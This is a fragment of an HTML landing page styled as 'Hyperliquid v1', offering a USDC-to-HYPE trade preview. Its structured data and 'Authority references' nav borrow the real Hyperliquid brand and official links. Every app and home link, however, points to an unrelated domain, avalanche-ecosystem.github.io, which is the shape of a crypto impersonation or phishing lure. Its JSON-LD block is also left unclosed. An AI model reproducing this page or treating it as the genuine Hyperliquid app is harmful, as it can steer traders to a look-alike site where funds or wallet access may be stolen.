  <link rel="manifest" href="site.webmanifest">
  <link rel="stylesheet" href="style.css">
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@graph": [
      {
        "@type": "WebSite",
        "@id": "https://hyperliquid-usa.github.io/#website",
        "url": "https://hyperliquid-usa.github.io/",
        "name": "Hyperliquid v1",
        "inLanguage": "en"
      },
      {
        "@type": "Organization",
        "@id": "https://hyperliquid-usa.github.io/#organization",
        "name": "Hyperliquid",
        "url": "https://hyperliquid.xyz/",
        "sameAs": [
          "https://hyperliquid.xyz/",
          "https://app.hyperliquid.xyz/",
          "https://x.com/HyperliquidX",
          "https://t.me/hyperliquid_announcements",
          "https://discord.com/invite/hyperliquid",
          "https://medium.com/@hyperliquid"
        ]
      },
      {
        "@type": "WebApplication",
        "@id": "https://hyperliquid-usa.github.io/#app",
        "name": "Hyperliquid v1",
        "applicationCategory": "FinanceApplication",
        "operatingSystem": "Web",
        "url": "https://hyperliquid-usa.github.io/",
        "offers": {
          "@type": "Offer",
          "price": "0",
          "priceCurrency": "USD"
        }
      }
    ]

</head>
<body>
  <header class="topbar">
    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer" aria-label="Hyperliquid v1 home">
      <img src="favicon.png" width="28" height="28" alt="">
      <span>Hyperliquid</span>
    </a>
    <nav class="nav" aria-label="Authority references">
      <a href="https://hypurrscan.io/" target="_blank" rel="nofollow noopener noreferrer">Hypurrscan</a>
      <a href="https://www.coingecko.com/en/coins/hyperliquid" target="_blank" rel="nofollow noopener noreferrer">CoinGecko HYPE</a>
      <a href="https://hyperliquid.xyz/" target="_blank" rel="nofollow noopener noreferrer">Official site</a>
    </nav>
    <span class="spacer"></span>
    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
  </header>

  <main class="stage">
    <section class="hero" aria-labelledby="page-title">
      <h1 id="page-title">Hyperliquid v1</h1>
      <p class="sub"><strong>Hyperliquid v1</strong> gives traders a clean preview path from USDC into HYPE before entering the live app.</p>
    </section>

    <section class="trade-card" aria-label="Trade preview">
      <div class="card-top">
        <span>Trade preview</span>
        <span>Preview only</span>
      </div>
      <div class="route">
        <div class="leg">
          <span class="label">From</span>
          <span class="asset">
            <img class="icon" src="usdc.png" width="30" height="30" alt="USDC">
            <span class="ticker">USDC</span>
          </span>
        </div>
        <button class="switch" type="button" data-switch aria-label="Switch trade direction">
          <span aria-hidden="true">&#8594;</span>
        </button>
        <div class="leg">
          <span class="label">To</span>
          <span class="asset">
            <img class="icon" src="hype.png" width="30" height="30" alt="HYPE">
            <span class="ticker">HYPE</span>
          </span>
        </div>
      </div>
      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
      <p class="note">Preview only</p>
    </section>
  </main>

  <footer class="footer">
    <b>Hyperliquid v1</b> &mdash; 2026
  </footer>

  <script>
  (function(){
    "use strict";
    var button = document.querySelector("[data-switch]");
    if (!button) return;
    button.addEventListener("click", function(){
      var assets = document.querySelectorAll(".leg .asset");
      if (assets.length !== 2) return;
      var first = assets[0].innerHTML;
      assets[0].innerHTML = assets[1].innerHTML;
      assets[1].innerHTML = first;
    });
  })();
  </script>
</body>
</html>
